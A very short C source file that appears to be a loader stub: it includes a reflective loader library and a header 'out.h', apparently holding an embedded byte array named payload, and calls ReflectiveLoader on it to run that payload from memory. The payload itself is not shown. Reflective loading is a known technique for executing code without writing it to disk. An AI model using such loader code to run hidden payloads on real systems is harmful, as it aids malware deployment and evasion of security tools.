#include <stdio.h>
#include "ReflectiveLoaderLibrary.h"
#include <windows.h>
#include "out.h"


int main(){
    ULONG_PTR baseAddress = ReflectiveLoader((ULONG_PTR)payload);
    return 0;
}
